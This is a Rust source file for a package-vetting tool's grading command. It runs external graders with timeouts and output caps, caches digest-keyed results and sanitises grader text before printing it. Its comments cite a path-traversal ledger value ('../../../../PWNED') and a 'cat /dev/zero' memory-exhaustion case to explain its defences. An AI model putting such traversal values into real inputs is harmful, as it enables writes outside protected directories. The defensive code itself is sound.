//! `pacrat grade` — run the configured graders against a store tree and
//! derive a verdict, or record a human's own judgement.
//!
//! The engine's whole job is to be **unable to invent a grade**. Every path
//! that is not "a grader returned a valid `pacrat-grade/v1` report about
//! exactly this subject" ends in that grader contributing nothing: a spawn
//! failure, a timeout, a non-zero exit, garbage on stdout, a report about
//! some other package. Nothing is inferred from the shape of a failure —
//! "the grader crashed, so probably fine" is precisely the reasoning ADR-001
//! forbids when it says failure is never Proceed. With no grading at all the
//! verdict is UNGRADED, which holds.
//!
//! Four other rules shape the code:
//!
//! - **The tree is the thing that was reviewed.** Graders run against
//!   `<store>/aur/packages/<name>/`, and a grading is cached under the
//!   commit that tree is at. Grading a *different* commit is refused rather
//!   than approximated, because a grading filed under commit C that actually
//!   read the tree at commit R is worse than no grading: it would let C
//!   through the gate later, unread.
//! - **A grading is about bytes, not about a commit.** Every cached grading
//!   records the tree's content digest, and a read whose digest no longer
//!   matches is a miss. A commit says what upstream published; it says
//!   nothing about what is in the store right now, and without the digest,
//!   editing a PKGBUILD after grading serves the old PROCEED forever.
//! - **Only a configured grader or a human answers.** A cached grading from
//!   a grader this host no longer runs can make a verdict worse and can
//!   never make one exist — see the quorum rule in
//!   [`pacrat_core::grading::Thresholds::verdict_of`], which is where that
//!   is decided.
//! - **Grader output is attacker text.** It has just been fed a PKGBUILD
//!   whose author would like to say things to the reviewer's terminal, so
//!   every string that comes back — titles, spans, the grader's own name,
//!   stderr — goes through [`crate::out::visible_line`] before it is
//!   printed: neutered, and flattened onto one line so it cannot forge one
//!   of pacrat's. How much of it there can be is bounded too
//!   ([`STDOUT_LIMIT`]), because the grader chooses that number otherwise.

use std::collections::BTreeMap;
use std::fs;
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::mpsc;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use serde::{Deserialize, Serialize};
use serde_json::Value;

use pacrat_core::config::{Grader, MANUAL};
use pacrat_core::grading::{
    commit_matches, has_quorum, worst_grade, Contribution, GradeReport, Standing, Subject,
    CONTRACT, PACRAT_SCALE,
};
use pacrat_core::{Thresholds, Verdict};

use crate::ctx::{self, Ctx};
use crate::fstree;
use crate::out::{shell_quote, truncate, visible_line};
use crate::vendor::valid_name;
use crate::HELD;

/// How often the runner asks whether the child has exited. Short enough that
/// a fast grader is not padded by the poll, long enough not to spin.
const POLL: Duration = Duration::from_millis(25);

/// How long to wait for the output-draining threads after the child exits.
/// Normally instant — the pipes are at EOF — but bounded, because `kill`
/// reaches the grader and not its children, and a grandchild holding the
/// write end would otherwise hang pacrat for as long as it lives. Losing a
/// grader's output beats losing the session.
const DRAIN_GRACE: Duration = Duration::from_secs(5);

/// The same, for a grader pacrat killed. Short: its output is already
/// unusable — a timeout is reported as a timeout, never as a partial
/// grading — and a killed grader is exactly the case most likely to have
/// left something behind holding the pipe.
const DRAIN_GRACE_KILLED: Duration = Duration::from_millis(100);

/// Findings shown per grader. The rest are counted — the CLI previews, the
/// TUI will scroll (ADR-001).
const FINDINGS_SHOWN: usize = 5;

/// The most stdout pacrat will hold from one grader.
///
/// A grading is a few kilobytes of JSON; four megabytes is room for a
/// pathological-but-honest grader and a hard stop for a dishonest one. The
/// bound has to exist because the grader chooses how much to write, and
/// `read_to_end` on a pipe fed by `cat /dev/zero` is a request for all the
/// memory on the machine — a hang or an OOM at exactly the moment pacrat is
/// supposed to be judging something hostile.
const STDOUT_LIMIT: usize = 4 * 1024 * 1024;

/// stderr only ever contributes one truncated line to a message, so it needs
/// far less — but it needs a bound for the same reason.
const STDERR_LIMIT: usize = 64 * 1024;

// ------------------------------------------------------------------ verbs

pub fn run(
    ctx: &Ctx,
    package: &str,
    commit: Option<&str>,
    grade: Option<u8>,
    note: Option<&str>,
    refresh: bool,
) -> Result<(), String> {
    if !valid_name(package) {
        return Err(format!(
            "{package:?} is not a package name — expected letters, digits, \
             and @._+- (no leading hyphen or dot)"
        ));
    }

    // Both paths grade something the store has taken custody of: the ledger
    // is what says which commit was reviewed, and a grading of a package
    // pacrat does not curate has nowhere to be read back from.
    let sources = ctx.load_sources()?;
    let entry = sources.packages.get(package).ok_or_else(|| {
        format!(
            "{package} is not in the ledger — only vendored packages are graded \
             (`pacrat vendor {package}` first)"
        )
    })?;

    // `Sources::from_toml` already rejects a ledger whose `reviewed` is not
    // a commit, and this checks it again anyway. The ledger is a synced file
    // and this value becomes a path component of the grade cache; the cost
    // of the second check is one comparison, and the cost of assuming the
    // first one ran is a `reviewed = "../../../../PWNED"` writing outside
    // the state directory. A `Sources` can also be built in memory, without
    // ever passing through the parser.
    let reviewed = check_commit(&entry.reviewed).map_err(|e| {
        format!(
            "{}: packages.{package}.reviewed: {e}",
            ctx.sources_path().display()
        )
    })?;

    // An abbreviation of the reviewed commit *is* the reviewed commit; the
    // cache is keyed by the full hash so a later run finds this grading.
    let commit = match commit {
        None => reviewed.to_string(),
        Some(c) => {
            let c = check_commit(c)?;
            if commit_matches(c, reviewed) {
                reviewed.to_string()
            } else {
                c.to_string()
            }
        }
    };

    match grade {
        Some(g) => {
            if refresh {
                return Err(
                    "--refresh re-runs graders; it has no meaning for a manual grade".into(),
                );
            }
            record_manual(ctx, package, &commit, g, note)
        }
        None => {
            if note.is_some() {
                return Err(
                    "--note records the reason for a --grade; it has no meaning \
                            on its own"
                        .into(),
                );
            }
            run_graders(ctx, package, &commit, reviewed, refresh)
        }
    }
}

/// The store tree and its content digest.
///
/// Every grading — a program's or a human's — is recorded against a digest,
/// so a tree edited afterwards invalidates it. A human's reading goes stale
/// for exactly the reason a tool's does: it was true about bytes that are no
/// longer there.
fn store_tree(ctx: &Ctx, package: &str) -> Result<(PathBuf, String), String> {
    let tree = ctx.store.join("aur").join("packages").join(package);
    if !tree.is_dir() {
        return Err(format!(
            "{package} has no store tree at {} — the ledger and the store disagree; \
             `pacrat vendor {package} --force` re-installs it",
            tree.display()
        ));
    }
    let digest = fstree::digest(&tree)?;
    Ok((tree, digest))
}

/// A human's own grading. The note is required because a grade with no
/// reason is unreviewable six months later — it says a number and nothing
/// about what was looked at.
fn record_manual(
    ctx: &Ctx,
    package: &str,
    commit: &str,
    grade: u8,
    note: Option<&str>,
) -> Result<(), String> {
    let note = note
        .ok_or("--grade needs --note: a recorded grade with no reason cannot be reviewed later")?;
    if note.trim().is_empty() {
        return Err("--note is empty".into());
    }
    if !PACRAT_SCALE.contains(grade) {
        return Err(format!(
            "grade {grade} is outside pacrat's scale {}-{}",
            PACRAT_SCALE.min, PACRAT_SCALE.max
        ));
    }

    let report = GradeReport {
        contract: CONTRACT.to_string(),
        grader: MANUAL.to_string(),
        subject: Subject {
            package: package.to_string(),
            commit: commit.to_string(),
            version: None,
        },
        grade,
        scale: PACRAT_SCALE,
        findings: Vec::new(),
        meta: BTreeMap::from([
            ("note".to_string(), note.into()),
            ("recorded_at".to_string(), now_secs().into()),
        ]),
    };
    // The same shape a program's grading gets — one cache, one reader, one
    // staleness rule.
    let (tree, digest) = store_tree(ctx, package)?;
    let dir = cache_dir(package)?;
    let path = ok_path(&dir, commit, MANUAL);
    write_grading(&path, &digest, &report.to_json())?;
    let _ = fs::remove_file(failed_path(&dir, commit, MANUAL));

    println!("package   {package}");
    println!("commit    {commit}");
    println!("tree      {}", tree.display());
    println!("digest    {digest}");
    println!("grader    {MANUAL}");
    println!("recorded  {}", path.display());
    let (safe_note, _) = visible_line(note);
    println!("note      {safe_note}");
    println!();
    hold_if_held(verdict_line(&ctx.config.thresholds, Some(grade)));
    Ok(())
}

fn run_graders(
    ctx: &Ctx,
    package: &str,
    commit: &str,
    reviewed: &str,
    refresh: bool,
) -> Result<(), String> {
    let (tree, digest) = store_tree(ctx, package)?;
    // Refusing beats approximating: the tree on disk is the reviewed commit,
    // and a grading of it must not be filed under a different one.
    if commit != reviewed {
        return Err(format!(
            "the store tree for {package} is at {reviewed}, not {commit} — a grader can \
             only read the tree that is there, so pacrat will not record its answer \
             against another commit. Grade the candidate through the update loop, or \
             record your own reading with --grade N --note …"
        ));
    }

    let dir = cache_dir(package)?;

    // Gradings nobody asked for this run — a manual one, or a grader since
    // removed from the config. Read before the early exit below, because a
    // recorded manual grading must be readable back on a host with no
    // external graders at all.
    let others = other_cached(&dir, commit, &digest, &ctx.config.graders, package);
    if ctx.config.graders.is_empty() && others.is_empty() {
        return Err(no_graders_message(package));
    }

    println!("package   {package}");
    println!("commit    {commit}");
    println!("tree      {}", tree.display());
    println!("digest    {digest}");

    let subj = Subj {
        package,
        commit,
        tree: &tree.to_string_lossy(),
        digest: &digest,
        refresh,
    };
    let mut answers: Vec<Answer> = Vec::new();

    for grader in &ctx.config.graders {
        println!();
        println!("grader    {}", grader.name);
        let outcome = grade_with(grader, &dir, &subj);
        report_outcome(&dir, commit, &digest, &grader.name, &outcome);
        answers.push(Answer {
            name: grader.name.clone(),
            standing: Standing::Configured,
            outcome,
        });
    }

    for (name, report) in others {
        println!();
        println!("grader    {name}");
        println!("cache     {}", ok_path(&dir, commit, &name).display());
        let standing = if name == MANUAL {
            Standing::Manual
        } else {
            Standing::Retired
        };
        let outcome = Outcome::Graded { report, took: None };
        report_outcome(&dir, commit, &digest, &name, &outcome);
        answers.push(Answer {
            name,
            standing,
            outcome,
        });
    }

    println!();
    hold_if_held(summarize(ctx, &answers));
    Ok(())
}

/// One grader's answer, and whether it is entitled to answer for this run.
struct Answer {
    name: String,
    standing: Standing,
    outcome: Outcome,
}

impl Answer {
    fn grade(&self) -> Option<u8> {
        match &self.outcome {
            Outcome::Graded { report, .. } => Some(report.pacrat_grade()),
            Outcome::Failed { .. } => None,
        }
    }

    fn contribution(&self) -> Contribution {
        Contribution::new(self.standing, self.grade())
    }
}

// ------------------------------------------------------------- one grader

/// What one grader produced. There is no third case: either a valid grading
/// about this subject, or nothing plus the reason there is nothing.
enum Outcome {
    /// `took` is how long the grader ran, or `None` when the grading came
    /// out of the cache and nothing ran at all.
    Graded {
        report: GradeReport,
        took: Option<Duration>,
    },
    Failed {
        reason: String,
        elapsed: Duration,
    },
}

/// Everything about the thing being graded that does not change per grader.
struct Subj<'a> {
    package: &'a str,
    commit: &'a str,
    /// The store tree's path, as the grader's `{tree}` argument.
    tree: &'a str,
    /// The store tree's content digest — the cache's real identity.
    digest: &'a str,
    /// Skip cache *reads*. Writes still happen: `--refresh` means "ask
    /// again", not "stop remembering".
    refresh: bool,
}

fn grade_with(grader: &Grader, dir: &Path, subj: &Subj) -> Outcome {
    let cache = ok_path(dir, subj.commit, &grader.name);
    if subj.refresh {
        println!("refresh   ignoring any cached grading (--refresh)");
    } else {
        match read_cache(&cache, subj.package, subj.commit, subj.digest) {
            CacheLook::Hit(report) => {
                println!("cache     {}", cache.display());
                return Outcome::Graded { report, took: None };
            }
            CacheLook::Miss => {}
            // The tree is not the tree that was graded. Not an error and not
            // a hit: the grading was true about bytes that are gone.
            CacheLook::Stale => {
                println!("stale     the store tree changed since it was graded — grading again")
            }
            // A cache entry we cannot trust is not a reason to hold — it is a
            // reason to ask again — but the user should know it was there.
            CacheLook::Unusable(e) => {
                println!("warning   ignoring {}: {e}", cache.display())
            }
        }
    }

    let argv = grader.argv(subj.package, subj.tree, subj.commit);
    let shown = argv
        .iter()
        .map(|a| shell_quote(a))
        .collect::<Vec<_>>()
        .join(" ");
    // Announced before it runs: a grader may sit for its whole timeout, and
    // ADR-001's always-visible-calls rule has no exception for slow ones.
    println!("run       {shown}");

    let timeout = Duration::from_secs(grader.timeout_s);
    let ran = match run_with_timeout(&argv, timeout) {
        Ok(ran) => ran,
        Err(reason) => {
            return Outcome::Failed {
                reason,
                elapsed: Duration::ZERO,
            }
        }
    };
    let elapsed = ran.elapsed;
    let fail = |reason: String| Outcome::Failed { reason, elapsed };

    if ran.timed_out {
        return fail(format!("timed out after {}s", grader.timeout_s));
    }
    // Before the exit status, because this *causes* an exit status: capping
    // the read closes the pipe, and a grader still writing into it dies of
    // SIGPIPE. Reported the other way round the reason would be "killed by
    // a signal", which is true, useless, and blames the wrong party.
    if ran.stdout.len() > STDOUT_LIMIT {
        return fail(format!(
            "output exceeded {} MB — a grading is a few kilobytes of JSON",
            STDOUT_LIMIT / (1024 * 1024)
        ));
    }
    match ran.code {
        Some(0) => {}
        Some(code) => return fail(format!("exited {code}{}", stderr_tail(&ran.stderr))),
        None => return fail(format!("killed by a signal{}", stderr_tail(&ran.stderr))),
    }

    let text = String::from_utf8_lossy(&ran.stdout);
    let report = match GradeReport::from_json(&text) {
        Ok(r) => r,
        Err(e) => return fail(visible_line(&e).0),
    };
    if let Err(e) = report.is_about(subj.package, subj.commit) {
        return fail(visible_line(&e).0);
    }
    // A grader whose scale moved is not one whose grades mean what they used
    // to; pacrat would happily rescale 70-of-100 into a mild WARN.
    if let Err(e) = grader.check_scale(report.scale) {
        return fail(e);
    }

    // Only a grading that survived every check is written to the cache; the
    // cache must never hold something a later read would have to re-judge.
    //
    // Keyed by *our* commit, never the grader's own spelling of it:
    // `is_about` accepts an abbreviation, and filing this under `3f9c21ab`
    // when every read asks for the full hash would be a cache that never
    // hits — the grader would be re-run, and paid for, on every invocation.
    // The tree digest recorded alongside is what the next read checks.
    if let Err(e) = write_grading(&cache, subj.digest, &text) {
        println!("warning   {e}");
    }
    let _ = fs::remove_file(failed_path(dir, subj.commit, &grader.name));
    Outcome::Graded {
        report,
        took: Some(elapsed),
    }
}

/// One grading, on pacrat's report. `freshness` says where it came from —
/// the grader just now, or the cache.
///
/// Every field here is the grader's text on pacrat's own report, so it goes
/// through `visible_line`: neutered *and* flattened, because a newline in a
/// title would otherwise let a grader write a line that looks exactly like
/// one of pacrat's.
fn print_grading(name: &str, report: &GradeReport, freshness: &str) {
    let mut line = format!(
        "grade {} of {}-{} · {freshness}",
        report.grade, report.scale.min, report.scale.max
    );
    // Only worth saying when the grader used its own scale.
    if report.scale != PACRAT_SCALE {
        line.push_str(&format!(" · pacrat {} of 0-4", report.pacrat_grade()));
    }
    println!("result    {line}");

    let (reported, _) = visible_line(&report.grader);
    if reported != name {
        println!("reports   as {:?}", truncate(&reported, 40));
    }
    if let Some(note) = report.meta.get("note").and_then(|v| v.as_str()) {
        println!("note      {}", truncate(&visible_line(note).0, 90));
    }

    for f in report.top_findings(FINDINGS_SHOWN) {
        let (title, _) = visible_line(&f.title);
        let span = match &f.span {
            Some(s) => format!("{} · ", truncate(&visible_line(s).0, 30)),
            None => String::new(),
        };
        println!("finding   [{}] {span}{}", f.level, truncate(&title, 80));
    }
    if report.findings.len() > FINDINGS_SHOWN {
        println!(
            "          … and {} more finding(s)",
            report.findings.len() - FINDINGS_SHOWN
        );
    }
}

fn report_outcome(dir: &Path, commit: &str, digest: &str, name: &str, outcome: &Outcome) {
    match outcome {
        Outcome::Graded { report, took } => {
            let freshness = match took {
                None => "cached".to_string(),
                Some(d) => format!("fresh {:.1}s", d.as_secs_f64()),
            };
            print_grading(name, report, &freshness);
        }
        Outcome::Failed { reason, elapsed } => {
            println!(
                "result    {} · {} · {:.1}s",
                Verdict::Ungraded,
                truncate(reason, 120),
                elapsed.as_secs_f64()
            );
            let path = failed_path(dir, commit, name);
            match record_failure(&path, name, commit, digest, reason) {
                // Kept so a later run — or the jobs view — can say why this
                // grader contributed nothing, without re-running it.
                Ok(()) => println!("recorded  {}", path.display()),
                Err(e) => println!("warning   {e}"),
            }
        }
    }
}

/// Print the caveats, then the verdict.
///
/// In that order on purpose: the verdict is the last line, which is what a
/// reader scrolled to the bottom sees and what a screenshot catches. A
/// caveat printed *after* it reads as a footnote to a decision already made,
/// when it is really a qualification of it.
fn summarize(ctx: &Ctx, answers: &[Answer]) -> Verdict {
    let contributions: Vec<Contribution> = answers.iter().map(Answer::contribution).collect();
    let quorum = has_quorum(&contributions);
    let worst = worst_grade(&contributions);

    let named = |standing: Standing, graded: bool| -> Vec<&str> {
        answers
            .iter()
            .filter(|a| a.standing == standing && a.grade().is_some() == graded)
            .map(|a| a.name.as_str())
            .collect()
    };
    let failed = named(Standing::Configured, false);
    let answered = named(Standing::Configured, true);
    let retired: Vec<&Answer> = answers
        .iter()
        .filter(|a| a.standing == Standing::Retired && a.grade().is_some())
        .collect();
    let manual = named(Standing::Manual, true);

    if !failed.is_empty() {
        if quorum {
            // Worst-wins over what answered is only sound if the reader
            // knows what did not: the missing grader could have been worse.
            println!(
                "warning   {} of {} configured grader{} produced no grading ({}) — this \
                 verdict rests on what did answer",
                failed.len(),
                failed.len() + answered.len(),
                if failed.len() + answered.len() == 1 {
                    ""
                } else {
                    "s"
                },
                failed.join(", ")
            );
        } else {
            println!(
                "reason    no configured grader answered ({} failed: {}) and there is no \
                 manual grading — ungraded holds; it is never read as proceed",
                failed.len(),
                failed.join(", ")
            );
        }
    } else if !quorum && manual.is_empty() && answered.is_empty() {
        println!(
            "reason    nothing graded this subject — ungraded holds; it is never read \
             as proceed"
        );
    }

    // A retired grading is evidence. Say so explicitly whenever one is in
    // play, because "worst-wins but cannot vouch" is not a rule a reader
    // should have to infer from a number.
    for a in &retired {
        let grade = a.grade().unwrap_or_default();
        if quorum {
            println!(
                "note      {} is not in this host's config; its cached grade {grade} still \
                 counts toward the worst",
                a.name
            );
        } else {
            println!(
                "note      {} has a cached grade of {grade} on file, but a grader this host \
                 no longer runs cannot answer for this run — it can only make a verdict \
                 worse, never make one exist",
                a.name
            );
        }
    }

    verdict_line(&ctx.config.thresholds, if quorum { worst } else { None })
}

/// The line the whole command exists to print. The thresholds are named on
/// it because the same grade is a different verdict on another host: the
/// number came from the grader, the reading of it is this host's config.
///
/// Shared with `review` and `adopt-update`: the verdict a human reads before
/// deciding has to be the same sentence, computed the same way, as the one
/// `grade` printed when the gradings were made.
pub fn verdict_line(t: &Thresholds, grade: Option<u8>) -> Verdict {
    let verdict = t.verdict(grade);
    let named = format!("pacrat thresholds warn≥{} block≥{}", t.warn_at, t.block_at);
    match grade {
        Some(g) => println!(
            "grade {g} of {}-{} → {verdict} ({named})",
            PACRAT_SCALE.min, PACRAT_SCALE.max
        ),
        None => println!("no grade → {verdict} ({named})"),
    }
    verdict
}

/// A verdict that holds must not exit 0. `pacrat grade x && pacrat build x`
/// is a thing people write, and BLOCK and UNGRADED are precisely the answers
/// that have to stop it — ADR-001's "BLOCK always holds", and its rule that
/// a grader failure is never Proceed. WARN is a note, not a hold.
fn hold_if_held(verdict: Verdict) {
    if matches!(verdict, Verdict::Block | Verdict::Ungraded) {
        std::process::exit(HELD);
    }
}

fn no_graders_message(package: &str) -> String {
    // Indented to sit under main's "pacrat: " prefix, and written as a
    // config block the reader can paste rather than a sentence about one.
    let lines = [
        "no graders configured, and no --grade given — there is nothing to run.",
        "",
        "       Configure one in ~/.config/pacrat/config.toml:",
        "",
        "           [[graders]]",
        "           name = \"yay-friend\"",
        "           cmd = [\"yay-friend\", \"--format\", \"pacrat\", \"--tree\", \"{tree}\", \"{package}\"]",
        "           timeout_s = 300",
        "",
        "       or record your own reading:",
        "",
    ];
    format!(
        "{}\n           pacrat grade {package} --grade 1 --note \"read the PKGBUILD, \
         no network in build()\"",
        lines.join("\n")
    )
}

// ------------------------------------------------------------ the subprocess

#[derive(Debug)]
struct Ran {
    code: Option<i32>,
    stdout: Vec<u8>,
    stderr: Vec<u8>,
    elapsed: Duration,
    timed_out: bool,
}

/// Run a grader with a wall-clock limit.
///
/// Both pipes are drained on their own threads rather than read after the
/// wait: a grader whose report exceeds the pipe buffer would block writing
/// while we blocked waiting, and we would report the deadlock as its
/// timeout. stdin is `/dev/null` so a grader that prompts fails fast instead
/// of hanging on a terminal that is not listening.
fn run_with_timeout(argv: &[String], timeout: Duration) -> Result<Ran, String> {
    let started = Instant::now();
    let mut child = Command::new(&argv[0])
        .args(&argv[1..])
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("could not run {}: {e}", argv[0]))?;

    let (tx, rx) = mpsc::channel::<(bool, Vec<u8>)>();
    for (is_err, limit, pipe) in [
        (false, STDOUT_LIMIT, child.stdout.take().map(PipeRead::Out)),
        (true, STDERR_LIMIT, child.stderr.take().map(PipeRead::Err)),
    ] {
        let Some(pipe) = pipe else { continue };
        let tx = tx.clone();
        std::thread::spawn(move || {
            // One byte past the limit, so the caller can tell "exactly at
            // the limit" from "more than we were willing to hold". Reading
            // to end unbounded is how `cat /dev/zero` becomes pacrat's
            // memory: the grader picks the number, not us.
            let mut buf = Vec::new();
            let mut capped = pipe.take(limit as u64 + 1);
            let _ = capped.read_to_end(&mut buf);
            let _ = tx.send((is_err, buf));
        });
    }
    drop(tx);

    let mut timed_out = false;
    let status = loop {
        match child.try_wait().map_err(|e| format!("{}: {e}", argv[0]))? {
            Some(status) => break status,
            None if started.elapsed() >= timeout => {
                let _ = child.kill();
                timed_out = true;
                break child.wait().map_err(|e| format!("{}: {e}", argv[0]))?;
            }
            None => std::thread::sleep(POLL),
        }
    };
    let elapsed = started.elapsed();

    let deadline = Instant::now()
        + if timed_out {
            DRAIN_GRACE_KILLED
        } else {
            DRAIN_GRACE
        };
    let (mut stdout, mut stderr) = (Vec::new(), Vec::new());
    for _ in 0..2 {
        let left = deadline.saturating_duration_since(Instant::now());
        match rx.recv_timeout(left) {
            Ok((true, buf)) => stderr = buf,
            Ok((false, buf)) => stdout = buf,
            Err(_) => break,
        }
    }

    Ok(Ran {
        code: status.code(),
        stdout,
        stderr,
        elapsed,
        timed_out,
    })
}

/// The two pipe types differ only in name; this lets one thread body read
/// either without boxing a trait object.
enum PipeRead {
    Out(std::process::ChildStdout),
    Err(std::process::ChildStderr),
}

impl Read for PipeRead {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        match self {
            PipeRead::Out(p) => p.read(buf),
            PipeRead::Err(p) => p.read(buf),
        }
    }
}

/// The first line of a grader's stderr, neutered — enough to say why it
/// failed without letting it paint the terminal.
fn stderr_tail(stderr: &[u8]) -> String {
    let text = String::from_utf8_lossy(stderr);
    let first = text.lines().find(|l| !l.trim().is_empty()).unwrap_or("");
    if first.is_empty() {
        return String::new();
    }
    // visible_line, not visible: this lands inside a single result line, so
    // even the line separators visible() preserves (U+2028) must fold.
    format!(" — {}", truncate(&visible_line(first).0, 100))
}

// ------------------------------------------------------------------ cache

/// `$XDG_STATE_HOME/pacrat/grades/<package>/` — host state, not store data:
/// a grading is cheap to recompute and specific to the graders this host has
/// configured, so it is not something to sync to the fleet.
fn cache_dir(package: &str) -> Result<PathBuf, String> {
    Ok(ctx::state_dir()?.join("grades").join(package))
}

fn ok_path(dir: &Path, commit: &str, grader: &str) -> PathBuf {
    dir.join(format!("{commit}.{grader}.json"))
}

fn failed_path(dir: &Path, commit: &str, grader: &str) -> PathBuf {
    dir.join(format!("{commit}.{grader}.failed.json"))
}

/// The grade cache's own wrapper around one grader's answer.
///
/// The grader's JSON is kept verbatim in `report` as a `Value` rather than a
/// re-serialized `GradeReport`, so a field this pacrat has never heard of
/// survives in the file for a version that has — the same forward
/// compatibility the contract promises, extended to the cache.
///
/// `tree` is the part pacrat cannot ask the grader for. A commit names what
/// upstream published; it says nothing about the bytes actually sitting in
/// the store, which a `git` mishap, a sync, or a hand edit can change under
/// a grading that has already been recorded. Without it, editing a PKGBUILD
/// after grading serves the old PROCEED forever.
#[derive(Serialize, Deserialize)]
struct CacheRecord {
    pacrat: String,
    tree: String,
    at: u64,
    report: Value,
}

const CACHE_TAG: &str = "grade-cache/v1";
const FAILURE_TAG: &str = "grader-failure/v1";

/// What the cache had to say about a subject.
enum CacheLook {
    Hit(GradeReport),
    /// Nothing on file.
    Miss,
    /// A grading of *these* bytes no longer — the tree changed since. A miss
    /// with a reason, never an error: the honest response is to grade again.
    Stale,
    /// A file that exists and cannot be believed.
    Unusable(String),
}

fn read_cache(path: &Path, package: &str, commit: &str, tree: &str) -> CacheLook {
    let Ok(text) = fs::read_to_string(path) else {
        return CacheLook::Miss;
    };
    let record: CacheRecord = match serde_json::from_str(&text) {
        Ok(r) => r,
        Err(e) => return CacheLook::Unusable(format!("not a grade-cache record: {e}")),
    };
    if record.pacrat != CACHE_TAG {
        return CacheLook::Unusable(format!("{:?} is not {CACHE_TAG:?}", record.pacrat));
    }
    // Before anything else: is this a grading of the tree that is there now?
    if record.tree != tree {
        return CacheLook::Stale;
    }
    // Re-validated on the way out, not trusted because we wrote it: the file
    // sits in a user-writable directory and may be years older than this
    // binary's idea of the contract.
    match GradeReport::from_json_value(record.report) {
        Err(e) => CacheLook::Unusable(e),
        Ok(report) => match report.is_about(package, commit) {
            Err(e) => CacheLook::Unusable(e),
            Ok(()) => CacheLook::Hit(report),
        },
    }
}

/// Write a cache file atomically.
///
/// `fs::write` truncates first, so an interrupted write would leave a
/// half-written grading that the next run has to reject — mirroring
/// `Ctx::save_sources`, the bytes land in a sibling temp file and a rename
/// puts them in place, which is all-or-nothing.
fn write_cache(path: &Path, json: &str) -> Result<(), String> {
    let dir = path
        .parent()
        .ok_or_else(|| format!("{}: no parent directory", path.display()))?;
    fs::create_dir_all(dir).map_err(|e| format!("{}: {e}", dir.display()))?;
    let name = path
        .file_name()
        .and_then(|n| n.to_str())
        .ok_or_else(|| format!("{}: unusable file name", path.display()))?;
    let tmp = dir.join(format!(".{name}.{}.new", std::process::id()));
    let write = || -> std::io::Result<()> {
        let mut f = fs::File::create(&tmp)?;
        f.write_all(json.as_bytes())?;
        f.sync_all()
    };
    write().map_err(|e| format!("{}: {e}", tmp.display()))?;
    fs::rename(&tmp, path).map_err(|e| {
        let _ = fs::remove_file(&tmp);
        format!("{}: {e}", path.display())
    })
}

fn write_grading(path: &Path, tree: &str, report: &str) -> Result<(), String> {
    let report: Value = serde_json::from_str(report)
        .map_err(|e| format!("{}: the grading did not re-parse: {e}", path.display()))?;
    let record = CacheRecord {
        pacrat: CACHE_TAG.to_string(),
        tree: tree.to_string(),
        at: now_secs(),
        report,
    };
    let json =
        serde_json::to_string_pretty(&record).map_err(|e| format!("{}: {e}", path.display()))?;
    write_cache(path, &format!("{json}\n"))
}

/// Why a grader produced nothing. Deliberately *not* a `GradeReport`: the
/// distinct top-level key means no reader can mistake this file for a
/// grading, whatever it does with the rest of the fields. It carries the
/// tree digest too, so a failure can be read as "against these bytes".
fn record_failure(
    path: &Path,
    grader: &str,
    commit: &str,
    tree: &str,
    reason: &str,
) -> Result<(), String> {
    let record = serde_json::json!({
        "pacrat": FAILURE_TAG,
        "grader": grader,
        "commit": commit,
        "tree": tree,
        "reason": reason,
        "at": now_secs(),
    });
    write_cache(path, &format!("{record:#}\n"))
}

/// Every cached grading of this subject, by grader name. Unreadable and
/// stale files are skipped: this is a scan, and a stray file here must not
/// fail the run.
///
/// `manual` first, then alphabetical — a human's reading leads.
fn scan_cached(dir: &Path, commit: &str, tree: &str, package: &str) -> Vec<(String, GradeReport)> {
    let prefix = format!("{commit}.");
    let mut found: Vec<(String, GradeReport)> = fs::read_dir(dir)
        .into_iter()
        .flatten()
        .filter_map(|e| e.ok())
        .filter_map(|e| {
            let file = e.file_name().into_string().ok()?;
            // `<commit>.<grader>.failed.json` is a failure record, not a
            // grading, and shares the prefix.
            if file.ends_with(".failed.json") {
                return None;
            }
            let name = file.strip_prefix(&prefix)?.strip_suffix(".json")?;
            if name.is_empty() {
                return None;
            }
            match read_cache(&e.path(), package, commit, tree) {
                CacheLook::Hit(report) => Some((name.to_string(), report)),
                _ => None,
            }
        })
        .collect();
    found.sort_by(|a, b| (a.0 != MANUAL, &a.0).cmp(&(b.0 != MANUAL, &b.0)));
    found
}

/// Cached gradings for this subject from graders that are not in the config
/// — the built-in `manual` one, or a grader since removed.
///
/// These are *evidence*, not answers. See `pacrat_core::grading`'s quorum
/// rule for what they may and may not do to a verdict.
fn other_cached(
    dir: &Path,
    commit: &str,
    tree: &str,
    configured: &[Grader],
    package: &str,
) -> Vec<(String, GradeReport)> {
    scan_cached(dir, commit, tree, package)
        .into_iter()
        .filter(|(name, _)| !configured.iter().any(|g| &g.name == name))
        .collect()
}

// ------------------------------------------------------- reading it back
//
// What `review` and `adopt-update` need, and all they need: the record, not
// the machinery that makes one. Deciding is not grading — a viewer that
// quietly spawned an LLM would be a surprise with a bill attached — so
// everything below reads and nothing below runs or writes.

/// One cached grading, and whether it is entitled to answer for this host.
pub struct Cached {
    /// The grader's name as the cache filed it.
    pub grader: String,
    pub standing: Standing,
    pub report: GradeReport,
}

impl Cached {
    fn contribution(&self) -> Contribution {
        Contribution::new(self.standing, Some(self.report.pacrat_grade()))
    }
}

/// Every cached grading of `package` at `commit` whose recorded tree digest
/// is `digest`.
///
/// The digest is not decoration: a candidate is graded as *bytes*, and these
/// are the bytes about to be adopted. A grading of the same commit against a
/// different tree is not a grading of this candidate and does not appear
/// here — same rule the grade cache applies to itself.
pub fn cached(ctx: &Ctx, package: &str, commit: &str, digest: &str) -> Result<Vec<Cached>, String> {
    let commit = check_commit(commit)?;
    let dir = cache_dir(package)?;
    Ok(scan_cached(&dir, commit, digest, package)
        .into_iter()
        .map(|(grader, report)| Cached {
            standing: standing_of(&grader, &ctx.config.graders),
            grader,
            report,
        })
        .collect())
}

/// A cached grading's standing: whose answer is it, as far as this host is
/// concerned right now? A grader in the config answered; a human always
/// answers; anything else on disk is evidence from a tool this host has
/// since stopped running.
fn standing_of(name: &str, configured: &[Grader]) -> Standing {
    if name == MANUAL {
        Standing::Manual
    } else if configured.iter().any(|g| g.name == name) {
        Standing::Configured
    } else {
        Standing::Retired
    }
}

/// Why a grader has no grading of this subject, if it left a record saying
/// so. `None` covers both "never asked" and "the record is about other
/// bytes" — neither of which is a reason to show the reader anything.
